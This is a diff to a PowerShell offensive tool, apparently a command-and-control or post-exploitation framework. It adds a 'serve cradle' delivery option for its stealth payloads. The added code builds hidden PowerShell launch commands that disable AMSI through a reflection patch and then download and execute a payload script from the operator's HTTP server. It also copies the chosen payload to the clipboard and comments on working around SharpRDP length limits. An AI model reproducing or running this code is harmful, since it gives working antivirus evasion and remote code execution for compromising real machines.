@@ -3171,11 +3171,26 @@ while (`$true) {
 		}
 		elseif($chosenFormat -eq 'stealth'){
 			$built = New-PayloadScript -ComputerName $ComputerName -PipeName $PipeName
-			Write-Output " Inline PS -- paste into existing PS session on target:"
+			$_pipeFile  = "pipe_$PipeName.ps1"
+			$_pipePath  = Join-Path $global:AmnesiacRoot $_pipeFile
+			$_srvIP     = if ($global:IP) { $global:IP } else { [System.Net.Dns]::GetHostByName($env:COMPUTERNAME).HostName }
+			$_srvAmsi   = "[ref].assembly.gettype('system.management.automation.amsiutils',`$false,`$true).getfield('amsiinitfailed',41).setvalue(`$null,`$true)"
+			$_srvCradle = "iex(new-object net.webclient).downloadstring('http://$_srvIP`:8080/$_pipeFile')"
+			$_srvCmd    = "powershell -nop -ep bypass -w hidden -c `"$_srvAmsi;$_srvCradle`""
+			$global:LastInlinePS = $built.InlinePS
+			[System.IO.File]::WriteAllText($_pipePath, $built.InlinePS, (New-Object System.Text.UTF8Encoding $False))
+			$_serveOk = $false
+			try { $_t = [Net.Sockets.TcpClient]::new(); $_t.Connect('127.0.0.1', 8080); $_t.Close(); $_serveOk = $true } catch {}
+			Write-Output " [1] Inline PS -- paste into existing PS session on target:"
 			Write-Output " $($built.InlinePS)"
 			Write-Output ""
-			Write-Host " [*] Stealth payload copied to clipboard (inline PS only -- too large for command-line launchers; use b64/gzip for standalone delivery)" -ForegroundColor Yellow
-			$_clipPayload = $built.InlinePS
+			Write-Output " [2] Serve cradle -- AMSI patch + download from operator HTTP server:"
+			Write-Output " $_srvCmd"
+			Write-Output ""
+			if (-not $_serveOk) { Write-Host " [!] serve not running -- run 'serve' in local shell before using option 2" -ForegroundColor Red }
+			Write-Host " Copy to clipboard [1] Inline PS  [2] Serve cradle: " -ForegroundColor Yellow -NoNewline
+			$_sc = (Read-Host).Trim()
+			$_clipPayload = if ($_sc -eq '2') { $_srvCmd } else { $built.InlinePS }
 		}
 		if ($_clipPayload) {
 			Set-Clipboard -Value $_clipPayload
@@ -3399,27 +3414,31 @@ while (`$true) {
 	elseif($chosenFormat -eq 'stealth'){
 		$stealthSID = if($global:Detach){'S-1-1-0'} else {$SID}
 		$built = New-PayloadScript -IsServer -PipeName $PN -SID $stealthSID
-		# Pre-build SharpRDP cradle: write InlinePS to operator disk so serve can host it.
-		# The full -enc b64 of InlinePS is ~10k chars — exceeds cmd.exe's 8191-char keyboard
-		# injection buffer in SharpRDP, silently truncating the payload. A download cradle
-		# encodes to ~120 chars, well within the limit.
-		$_pipeFile = "pipe_$PN.ps1"
-		$_pipePath = Join-Path $global:AmnesiacRoot $_pipeFile
-		$_operatorIP = if ($global:IP) { $global:IP } else { [System.Net.Dns]::GetHostByName($env:COMPUTERNAME).HostName }
+		$_pipeFile    = "pipe_$PN.ps1"
+		$_pipePath    = Join-Path $global:AmnesiacRoot $_pipeFile
+		$_operatorIP  = if ($global:IP) { $global:IP } else { [System.Net.Dns]::GetHostByName($env:COMPUTERNAME).HostName }
 		$_rdpAmsi     = "[ref].assembly.gettype('system.management.automation.amsiutils',`$false,`$true).getfield('amsiinitfailed',41).setvalue(`$null,`$true)"
 		$_rdpCradle   = "iex(new-object net.webclient).downloadstring('http://$_operatorIP`:8080/$_pipeFile')"
 		$_sharpRDPCmd = "command=powershell -nop -ep bypass -w hidden -c `"$_rdpAmsi;$_rdpCradle`""
-		Write-Output " Inline PS -- paste into existing PS session on target:"
-		Write-Output " $($built.InlinePS)"
-		Write-Output ""
-		# Write pipe file to disk for sharprdp last-resort delivery (serve-based download cradle).
+		$_srvCmd      = "powershell -nop -ep bypass -w hidden -c `"$_rdpAmsi;$_rdpCradle`""
+		# Write pipe file to disk for serve-based delivery (option 2) and SharpRDP last-resort.
 		# winrm delivery uses $global:LastInlinePS directly — no serve or disk file needed.
 		[System.IO.File]::WriteAllText($_pipePath, $built.InlinePS, (New-Object System.Text.UTF8Encoding $False))
 		$global:LastSharpRDPB64 = $_sharpRDPCmd
 		$global:LastSharpRDPCradleFile = $_pipeFile
 		$global:LastInlinePS = $built.InlinePS
-		Write-Host " [*] Stealth payload copied to clipboard (inline PS only -- too large for command-line launchers; use b64/gzip for standalone delivery)" -ForegroundColor Yellow
-		$_clipPayload = $built.InlinePS
+		$_serveOk = $false
+		try { $_t = [Net.Sockets.TcpClient]::new(); $_t.Connect('127.0.0.1', 8080); $_t.Close(); $_serveOk = $true } catch {}
+		Write-Output " [1] Inline PS -- paste into existing PS session on target:"
+		Write-Output " $($built.InlinePS)"
+		Write-Output ""
+		Write-Output " [2] Serve cradle -- AMSI patch + download from operator HTTP server:"
+		Write-Output " $_srvCmd"
+		Write-Output ""
+		if (-not $_serveOk) { Write-Host " [!] serve not running -- run 'serve' in local shell before using option 2" -ForegroundColor Red }
+		Write-Host " Copy to clipboard [1] Inline PS  [2] Serve cradle: " -ForegroundColor Yellow -NoNewline
+		$_sc = (Read-Host).Trim()
+		$_clipPayload = if ($_sc -eq '2') { $_srvCmd } else { $built.InlinePS }
 	}
 	if ($_clipPayload) {
 		Set-Clipboard -Value $_clipPayload
